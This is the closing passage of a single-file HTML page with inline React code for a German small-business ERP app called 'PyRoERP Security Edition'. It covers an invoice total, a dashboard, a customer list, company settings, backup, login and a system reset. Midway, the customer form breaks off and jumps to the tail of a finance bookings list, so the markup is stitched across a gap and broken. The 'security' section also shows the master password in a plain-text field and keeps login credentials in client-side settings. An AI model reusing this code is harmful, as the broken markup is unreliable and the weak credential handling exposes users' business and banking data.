                                            <InputField label="Rabatt (%)" type="number" value={invoiceRabatt} onChange={setInvoiceRabatt} extraClass="text-right font-bold"/>
                                            <InputField label="Versandkosten (€)" type="number" value={invoiceVersand} onChange={setInvoiceVersand} extraClass="text-right font-bold"/>
                                        </div>
                                    </div>
                                    <div className="p-6 bg-white dark:bg-slate-900 border-t dark:border-slate-800 rounded-b-[2rem] flex justify-between items-center">
                                        <span className="text-3xl font-black text-emerald-600 dark:text-emerald-400">Total: {((invoiceItems.reduce((s,i)=>s+((parseFloat(i.preis)||0)*(parseInt(i.auswahlMenge)||1)),0) * (1-(parseFloat(invoiceRabatt)||0)/100)) + parseFloat(invoiceVersand||0)).toFixed(2)} €</span>
                                        <button onClick={()=>generatePDF('Rechnung', invoiceModal)} className="bg-indigo-600 text-white px-8 py-3 rounded-xl font-bold flex gap-2 hover:bg-indigo-700 shadow-lg"><Icon name="printer"/> PDF Generieren</button>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* --- SIDEBAR --- */}
                        <aside className="w-72 bg-[#0F172A] dark:bg-[#020617] text-white p-8 flex flex-col shadow-2xl z-10 transition-colors">
                            <div className="mb-10 text-center">
                                <h1 className="text-4xl font-black text-indigo-400 italic tracking-tighter">PyRo<span className="text-white">ERP</span></h1>
                                <p className="text-[10px] text-slate-400 font-bold uppercase tracking-[0.3em] mt-2">Security Edition</p>
                            </div>
                            <nav className="space-y-2 flex-1 font-semibold text-sm">
                                <button onClick={()=>setView('dashboard')} className={`w-full flex items-center gap-3 p-4 rounded-xl ${view==='dashboard'?'bg-indigo-600 shadow-lg':'text-slate-400 hover:bg-white/5'}`}><Icon name="layout-dashboard"/> Dashboard</button>
                                <button onClick={()=>setView('kunden')} className={`w-full flex items-center gap-3 p-4 rounded-xl ${view==='kunden'?'bg-indigo-600 shadow-lg':'text-slate-400 hover:bg-white/5'}`}><Icon name="users"/> Kunden & Sales</button>
                                <button onClick={()=>setView('lager')} className={`w-full flex items-center gap-3 p-4 rounded-xl ${view==='lager'?'bg-indigo-600 shadow-lg':'text-slate-400 hover:bg-white/5'}`}><Icon name="package"/> Lager & Baugruppen</button>
                                <button onClick={()=>setView('finanzen')} className={`w-full flex items-center gap-3 p-4 rounded-xl ${view==='finanzen'?'bg-indigo-600 shadow-lg':'text-slate-400 hover:bg-white/5'}`}><Icon name="trending-up"/> EÜR & Finanzen</button>
                                <button onClick={()=>setView('settings')} className={`w-full flex items-center gap-3 p-4 rounded-xl ${view==='settings'?'bg-indigo-600 shadow-lg':'text-slate-400 hover:bg-white/5'}`}><Icon name="settings"/> Profil & Setup</button>
                            </nav>
                            <div className="mt-auto space-y-4">
                                <button onClick={()=>setIsDark(!isDark)} className="w-full flex items-center justify-center gap-2 p-3 border border-slate-700 rounded-xl text-xs font-bold text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"><Icon name={isDark ? "sun" : "moon"} size={14}/> {isDark ? "Light Mode" : "Dark Mode"}</button>
                                <div className="p-4 border border-indigo-500/20 bg-indigo-500/10 rounded-xl text-center"><p className="text-[10px] text-indigo-400 font-black uppercase tracking-tighter">Developer</p><p className="font-bold text-white tracking-tight text-lg">Harald Haug</p></div>
                            </div>
                        </aside>

                        <main className="flex-1 overflow-y-auto p-10 custom-scrollbar">
                            
                            {/* --- DASHBOARD --- */}
                            {view === 'dashboard' && (
                                <div className="max-w-6xl mx-auto space-y-8 animate-fade">
                                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                                        <div className="col-span-2 bg-indigo-600 dark:bg-indigo-900 p-10 rounded-[2.5rem] shadow-xl text-white flex flex-col justify-between relative overflow-hidden">
                                            <div className="absolute -right-10 -top-10 opacity-10"><Icon name="sun" size={200}/></div>
                                            <div>
                                                <h2 className="text-5xl font-black mb-2 tracking-tight">{currentTime.toLocaleTimeString('de-DE', {hour: '2-digit', minute:'2-digit'})} Uhr</h2>
                                                <p className="text-indigo-200 font-bold text-lg">{currentTime.toLocaleDateString('de-DE', {weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'})}</p>
                                            </div>
                                            <div className="mt-8 pt-6 border-t border-indigo-500/50">
                                                <p className="text-[10px] uppercase font-black tracking-widest text-indigo-300 mb-1">Quote of the Day</p>
                                                <p className="font-medium italic">"{quoteOfTheDay}"</p>
                                            </div>
                                        </div>
                                        <div className="bg-white dark:bg-slate-900 p-8 rounded-[2.5rem] shadow-sm border border-slate-100 dark:border-slate-800 flex flex-col items-center justify-center text-center">
                                            <Icon name={weather.temp !== '--' ? "cloud-sun" : "cloud-off"} size={48} className="text-slate-400 mb-4"/>
                                            <p className="text-4xl font-black text-slate-700 dark:text-slate-200">{weather.temp}°C</p>
                                            <p className="text-xs font-bold text-slate-400 uppercase mt-2">{weather.desc}</p>
                                        </div>
                                    </div>

                                    {lowStockItems.length > 0 && (
                                        <div className="bg-rose-100 dark:bg-rose-900/30 border-l-4 border-rose-500 p-6 rounded-r-2xl flex items-center gap-4 shadow-sm">
                                            <Icon name="alert-triangle" className="text-rose-500"/>
                                            <div><p className="font-bold text-rose-800 dark:text-rose-400">Bestandswarnung!</p><p className="text-sm text-rose-600 dark:text-rose-300">{lowStockItems.length} Artikel sind auf oder unter ihren Mindestbestand gefallen.</p></div>
                                        </div>
                                    )}

                                    <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
                                        <div className="bg-white dark:bg-slate-900 p-8 rounded-[2rem] shadow-sm border border-slate-100 dark:border-slate-800"><p className="text-[10px] font-bold text-slate-400 uppercase">Einnahmen</p><p className="text-3xl font-black text-emerald-600 dark:text-emerald-400">{einnahmenTotal.toFixed(2)}€</p></div>
                                        <div className="bg-white dark:bg-slate-900 p-8 rounded-[2rem] shadow-sm border border-slate-100 dark:border-slate-800"><p className="text-[10px] font-bold text-slate-400 uppercase">Ausgaben</p><p className="text-3xl font-black text-rose-500 dark:text-rose-400">{ausgabenTotal.toFixed(2)}€</p></div>
                                        <div className="bg-white dark:bg-slate-900 p-8 rounded-[2rem] shadow-sm border border-slate-100 dark:border-slate-800"><p className="text-[10px] font-bold text-slate-400 uppercase">Reingewinn</p><p className="text-3xl font-black text-indigo-600 dark:text-indigo-400">{(einnahmenTotal-ausgabenTotal).toFixed(2)}€</p></div>
                                        <div className="bg-slate-900 dark:bg-slate-800 p-8 rounded-[2rem] text-white shadow-xl border border-slate-800 dark:border-slate-700"><p className="text-[10px] font-bold text-slate-400 uppercase">Lagerwert (EK)</p><p className="text-3xl font-black">{lager.reduce((a,b)=>a+((parseFloat(b.menge)||0)*(parseFloat(b.einkaufspreis)||0)),0).toFixed(0)}€</p></div>
                                    </div>

                                    <div className="bg-white dark:bg-slate-900 p-10 rounded-[2.5rem] shadow-sm border border-slate-100 dark:border-slate-800 h-80 flex flex-col">
                                        <h3 className="font-black text-xl mb-6 flex items-center gap-2"><Icon name="bar-chart-2" className="text-indigo-600 dark:text-indigo-400"/> Tages-Umsätze (Letzte Einnahmen)</h3>
                                        <div className="flex-1 flex items-end gap-4">
                                            {chartData.map((d, i) => (
                                                <div key={i} className="flex-1 flex flex-col items-center gap-2 group h-full justify-end">
                                                    <div className="w-full bg-indigo-500 dark:bg-indigo-600 rounded-t-xl relative chart-bar" style={{height: `${(d.betrag/maxChart)*100}%`, minHeight:'10px'}}><span className="absolute -top-6 left-1/2 -translate-x-1/2 text-[10px] font-bold text-slate-600 dark:text-slate-300 opacity-0 group-hover:opacity-100 transition-opacity">{d.betrag.toFixed(0)}€</span></div>
                                                    <span className="text-[9px] font-bold text-slate-400">{d.datum.slice(0,5)}</span>
                                                </div>
                                            ))}
                                            {chartData.length === 0 && <p className="text-slate-400 w-full text-center font-bold">Keine Daten verfügbar.</p>}
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* --- KUNDEN VIEW --- */}
                            {view === 'kunden' && (
                                <div className="max-w-6xl mx-auto space-y-6 animate-fade">
                                    <div className="flex justify-between items-end mb-6">
                                        <div className="w-1/2 relative"><Icon name="search" className="absolute left-4 top-4 text-slate-400"/><input type="text" placeholder="Suche (Name, KD-Nr, Firma)..." value={searchTermKunden} onChange={e=>setSearchTermKunden(e.target.value)} className="w-full bg-white dark:bg-slate-900 p-4 pl-12 rounded-[1.5rem] outline-none shadow-sm font-bold border border-slate-100 dark:border-slate-800 text-slate-900 dark:text-white"/></div>
                                        <div className="flex gap-4"><button onClick={()=>exportCSV('kunden')} className="bg-white dark:bg-slate-900 border dark:border-slate-800 px-6 py-4 rounded-2xl font-bold shadow-sm flex items-center gap-2 hover:bg-slate-50 dark:hover:bg-slate-800"><Icon name="download"/> CSV</button><button onClick={addKunde} className="bg-indigo-600 text-white px-8 py-4 rounded-2xl font-bold shadow-lg hover:bg-indigo-700">+ Neuer Kunde</button></div>
                                    </div>
                                    {filteredKunden.map(k => (
                                        <div key={k.id} className="bg-white dark:bg-slate-900 rounded-[2rem] border border-slate-100 dark:border-slate-800 shadow-sm overflow-hidden mb-3">
                                            <div onClick={() => setOpenId(openId === k.id ? null : k.id)} className="p-5 flex items-center justify-between cursor-pointer hover:bg-slate-50 dark:hover:bg-slate-800">
                                                <div className="flex items-center gap-6 flex-1">
                                                    <span className="bg-indigo-50 dark:bg-indigo-900/30 text-indigo-600 dark:text-indigo-400 text-[10px] font-black px-3 py-1 rounded-full">{k.kdNr}</span>
                                                    <p className="font-black w-1/4 truncate">{k.vorname} {k.nachname || 'Neu'}</p>
                                                    <p className="text-slate-400 font-medium text-sm w-1/4 truncate">{k.email || "Keine E-Mail"}</p>
                                                    <p className="text-[10px] font-bold uppercase text-slate-400 w-1/4 text-right pr-6">{k.typ}</p>
                                                </div>
                                                <Icon name={openId === k.id ? "chevron-up" : "chevron-down"} className="text-slate-400" />
                                            </div>
                                            {openId === k.id && (
                                                <div className="p-8 border-t border-slate-50 dark:border-slate-800 grid grid-cols-1 lg:grid-cols-3 gap-8 bg-slate-50/50 dark:bg-slate-900">
                                                    <div className="lg:col-span-2 grid grid-cols-2 md:grid-cols-4 gap-4">
                                                        <InputField label="Typ" type="text" value={k.typ} onChange={v=>setKunden(kunden.map(x=>x.id===k.id?{...x, typ:v}:x))} colSpan="col-span-1" />
                                                        <InputField label="Anrede" type="text" value={k.anrede} onChange={v=>setKunden(kunden.map(x=>x.id===k.id?{...x, anrede:v}:x))} colSpan="col-span-1" />
                                                        <InputField label="Firma (B2B)" type="text" value={k.firma} onChange={v=>setKunden(kunden.map(x=>x.id===k.id?{...x, firma:v}:x))} colSpan="col-span-2" extraClass="text-indigo-600 dark:text-indigo-400 font-bold"/>
                                                        <InputField label="Vorname" type="text" value={k.vorname} onChange={v=>setKunden(kunden.map(x=>x.id===k.id?{...x, vorname:v}:x))} colSpan="col-span-2" />
                                                        <InputField label="Nachname" type="text" value={k.nachname} onChange={v=>setKunden(kunden.map(x=>x.id===k.id?{...x, nachname:v}:x))} colSpan="col-span-2" />
                                                        <InputField label="Strasse" type="text" value={k.strasse} onChange={v=>setKunden(kunden.map(x=>x.id===k.id?{...x, strasse:v}:x))} colSpan="col-span-3" />
                                                        <InputField label="Nr" type="text" value={k.hausnummer} onChange={v=>setKunden(kunden.map(x=>x.id===k.id?{...x, hausnummer:v}:x))} colSpan="col-span-1" />

                                                </div>

                                                ))}
                                                {(finanzen.einnahmen||[]).length === 0 && (finanzen.ausgaben||[]).length === 0 && <p className="text-slate-500 text-center py-4">Keine Buchungen vorhanden.</p>}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* --- SETTINGS --- */}
                            {view === 'settings' && (
                                <div className="max-w-4xl mx-auto space-y-8 animate-fade pb-10">
                                    <div className="flex justify-between items-center mb-6">
                                        <h2 className="text-4xl font-black">Profil & Setup</h2>
                                        <button onClick={() => appSettings.profileLocked ? requireMasterPass(() => setAppSettings({...appSettings, profileLocked: false})) : setAppSettings({...appSettings, profileLocked: true})} className={`px-6 py-3 rounded-xl font-bold shadow-md flex items-center gap-2 transition-colors ${appSettings.profileLocked ? 'bg-indigo-600 text-white hover:bg-indigo-700' : 'bg-rose-500 text-white hover:bg-rose-600'}`}>
                                            <Icon name={appSettings.profileLocked ? 'lock' : 'unlock'}/> {appSettings.profileLocked ? 'Profil entsperren' : 'Profil sperren'}
                                        </button>
                                    </div>

                                    <div className={`bg-white dark:bg-slate-900 p-10 rounded-[3rem] shadow-sm border border-slate-100 dark:border-slate-800 grid grid-cols-2 gap-6 transition-opacity ${appSettings.profileLocked ? 'opacity-70 pointer-events-none' : ''}`}>
                                        <div className="col-span-2 flex items-center gap-6 mb-4">
                                            <div className="w-24 h-24 bg-slate-50 dark:bg-slate-800 border-2 border-dashed border-slate-200 dark:border-slate-700 rounded-2xl flex items-center justify-center relative overflow-hidden">
                                                {firma.logo ? <img src={firma.logo} className="w-full h-full object-contain" /> : <Icon name="image" className="text-slate-400"/>}
                                                <input type="file" disabled={appSettings.profileLocked} className="absolute inset-0 opacity-0 disabled:cursor-not-allowed cursor-pointer" onChange={(e)=>{ const r = new FileReader(); r.onload = () => setFirma({...firma, logo:r.result}); r.readAsDataURL(e.target.files[0]); }}/>
                                            </div>
                                            <div><p className="font-bold">Firmen-Logo</p><p className="text-xs text-slate-400">Erscheint oben rechts auf PDF-Dokumenten.</p></div>
                                        </div>
                                        <InputField disabled={appSettings.profileLocked} label="Firmenname" value={firma.name} onChange={v=>setFirma({...firma, name:v})} extraClass="font-black text-indigo-600 dark:text-indigo-400"/>
                                        <InputField disabled={appSettings.profileLocked} label="Inhaber" value={firma.inhaber} onChange={v=>setFirma({...firma, inhaber:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="Strasse" value={firma.adresse} onChange={v=>setFirma({...firma, adresse:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="Hausnummer" value={firma.hausnummer} onChange={v=>setFirma({...firma, hausnummer:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="PLZ" value={firma.plz} onChange={v=>setFirma({...firma, plz:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="Ort" value={firma.ort} onChange={v=>setFirma({...firma, ort:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="Telefon" value={firma.telefon} onChange={v=>setFirma({...firma, telefon:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="E-Mail" value={firma.email} onChange={v=>setFirma({...firma, email:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="Webseite" value={firma.webseite} onChange={v=>setFirma({...firma, webseite:v})} colSpan="col-span-2"/>
                                        
                                        <div className="col-span-2 pt-6 mt-2 border-t border-slate-100 dark:border-slate-800 flex justify-between items-center">
                                            <p className="font-black text-xs uppercase text-indigo-500">Steuer & Bankdaten</p>
                                            <label className={`flex items-center gap-2 text-sm font-bold text-slate-500 ${appSettings.profileLocked?'cursor-not-allowed':'cursor-pointer'}`}><input type="checkbox" disabled={appSettings.profileLocked} checked={firma.isKleinunternehmer} onChange={e=>setFirma({...firma, isKleinunternehmer: e.target.checked})} className="accent-indigo-600 w-4 h-4"/> Kleinunternehmerregelung aktiv</label>
                                        </div>
                                        <InputField disabled={appSettings.profileLocked} label="USt-ID (Optional)" value={firma.ustid} onChange={v=>setFirma({...firma, ustid:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="Steuer-Nummer (Optional)" value={firma.steuerNr} onChange={v=>setFirma({...firma, steuerNr:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="Bankname" value={firma.bank} onChange={v=>setFirma({...firma, bank:v})} colSpan="col-span-2"/>
                                        <InputField disabled={appSettings.profileLocked} label="IBAN" value={firma.iban} onChange={v=>setFirma({...firma, iban:v})} />
                                        <InputField disabled={appSettings.profileLocked} label="BIC" value={firma.bic} onChange={v=>setFirma({...firma, bic:v})} />

                                        <div className="col-span-2 pt-6 mt-2 border-t border-slate-100 dark:border-slate-800"><p className="font-black text-xs uppercase text-indigo-500 mb-2">Nummernkreisläufe (Matrix)</p><p className="text-[10px] text-slate-400 mb-4">Platzhalter: {`{YYYY}`} = Jahr, {`{MM}`} = Monat, {`{NR}`} = Fortlaufende Nummer.</p></div>
                                        
                                        <div className="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-xl col-span-2 grid grid-cols-2 gap-4">
                                            <InputField disabled={appSettings.profileLocked} label="Matrix: Rechnung" value={firma.formatRechnung} onChange={v=>setFirma({...firma, formatRechnung:v})} extraClass="font-mono text-xs text-indigo-600 dark:text-indigo-400"/>
                                            <InputField disabled={appSettings.profileLocked} label="Nächste Rechnungs-Nr" type="number" value={firma.currentRechnung} onChange={v=>setFirma({...firma, currentRechnung:v})} extraClass="font-mono text-xs"/>
                                        </div>
                                        <div className="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-xl col-span-2 grid grid-cols-2 gap-4">
                                            <InputField disabled={appSettings.profileLocked} label="Matrix: Storno" value={firma.formatStorno} onChange={v=>setFirma({...firma, formatStorno:v})} extraClass="font-mono text-xs text-rose-500 dark:text-rose-400"/>
                                            <InputField disabled={appSettings.profileLocked} label="Nächste Storno-Nr" type="number" value={firma.currentStorno} onChange={v=>setFirma({...firma, currentStorno:v})} extraClass="font-mono text-xs"/>
                                        </div>
                                        <div className="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-xl col-span-2 grid grid-cols-2 gap-4">
                                            <InputField disabled={appSettings.profileLocked} label="Matrix: Retoure" value={firma.formatRetoure} onChange={v=>setFirma({...firma, formatRetoure:v})} extraClass="font-mono text-xs text-amber-500 dark:text-amber-400"/>
                                            <InputField disabled={appSettings.profileLocked} label="Nächste Retouren-Nr" type="number" value={firma.currentRetoure} onChange={v=>setFirma({...firma, currentRetoure:v})} extraClass="font-mono text-xs"/>
                                        </div>
                                        <InputField disabled={appSettings.profileLocked} label="Startwert Kundennummern" type="number" value={firma.kundenNrStart} onChange={v=>setFirma({...firma, kundenNrStart:v})} colSpan="col-span-2"/>
                                    </div>

                                    {/* BACKUP & RESTORE */}
                                    <div className="bg-emerald-50 dark:bg-emerald-900/10 p-8 rounded-[3rem] border border-emerald-100 dark:border-emerald-900/30 grid grid-cols-1 md:grid-cols-2 gap-6 items-center">
                                        <div><h3 className="text-xl font-black text-emerald-600 dark:text-emerald-400 mb-2 flex items-center gap-2"><Icon name="database"/> System-Backup</h3><p className="text-xs text-emerald-800/60 dark:text-emerald-300/60">Sichere alle deine Daten regelmäßig als JSON-Datei.</p></div>
                                        <div className="flex flex-col gap-3">
                                            <button onClick={downloadBackup} className="bg-emerald-600 text-white p-3 rounded-xl font-bold text-sm shadow-md hover:bg-emerald-700 flex justify-center items-center gap-2"><Icon name="download" size={16}/> Voll-Backup laden (JSON)</button>
                                            <label className="bg-white dark:bg-slate-800 border border-emerald-200 dark:border-emerald-800 text-emerald-700 dark:text-emerald-400 p-3 rounded-xl font-bold text-sm text-center cursor-pointer hover:bg-emerald-50 dark:hover:bg-emerald-900/40 transition-colors flex justify-center items-center gap-2">
                                                <Icon name="upload" size={16}/> Backup wiederherstellen
                                                <input type="file" accept=".json" onChange={restoreBackup} className="hidden"/>
                                            </label>
                                        </div>
                                    </div>

                                    {/* SECURITY SECTION */}
                                    <div className="bg-indigo-50 dark:bg-indigo-900/10 p-10 rounded-[3rem] border border-indigo-100 dark:border-indigo-900/30">
                                        <h3 className="text-xl font-black text-indigo-600 dark:text-indigo-400 mb-6 flex items-center gap-2"><Icon name="shield"/> Sicherheit & Login</h3>
                                        <div className="grid grid-cols-2 gap-6">
                                            <InputField label="Master-Passwort (Für Löschungen & Reset)" value={appSettings.masterPassword} onChange={v=>setAppSettings({...appSettings, masterPassword:v})} extraClass="font-bold text-indigo-600 dark:text-indigo-400" />
                                            <div className="flex items-center gap-3 pt-6">
                                                <input type="checkbox" checked={appSettings.loginEnabled} onChange={e=>setAppSettings({...appSettings, loginEnabled:e.target.checked})} className="w-5 h-5 accent-indigo-600"/>
                                                <span className="font-bold text-sm">System-Login beim Start verlangen</span>
                                            </div>
                                            {appSettings.loginEnabled && (
                                                <>
                                                    <InputField label="Login Benutzername" value={appSettings.loginUser} onChange={v=>setAppSettings({...appSettings, loginUser:v})} />
                                                    <InputField label="Login Passwort" type="password" value={appSettings.loginPass} onChange={v=>setAppSettings({...appSettings, loginPass:v})} />
                                                </>
                                            )}
                                        </div>
                                    </div>
                                    
                                    {/* SYSTEM RESET SECTION */}
                                    <div className="pt-8 border-t border-rose-200 dark:border-rose-900/50">
                                        <div className="bg-rose-100 dark:bg-rose-900/20 p-8 rounded-[2rem] border border-rose-200 dark:border-rose-800 flex justify-between items-center shadow-inner">
                                            <div className="w-2/3">
                                                <h3 className="text-xl font-black text-rose-600 dark:text-rose-400 mb-1 flex items-center gap-2"><Icon name="alert-octagon"/> System-Reset (Gefahrenzone)</h3>
                                                <p className="text-xs text-rose-800/70 dark:text-rose-300/70">Löscht ALLE Kunden, Lagerbestände, Rechnungen und Einstellungen unwiderruflich vom Gerät.</p>
                                            </div>
                                            <button onClick={handleSystemReset} className="bg-rose-600 text-white px-6 py-3 rounded-xl font-bold shadow-lg hover:bg-rose-700 flex items-center gap-2 transition-colors"><Icon name="trash-2"/> System komplett löschen</button>
                                        </div>
                                    </div>

                                </div>
                            )}
                        </main>
                    </div>
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
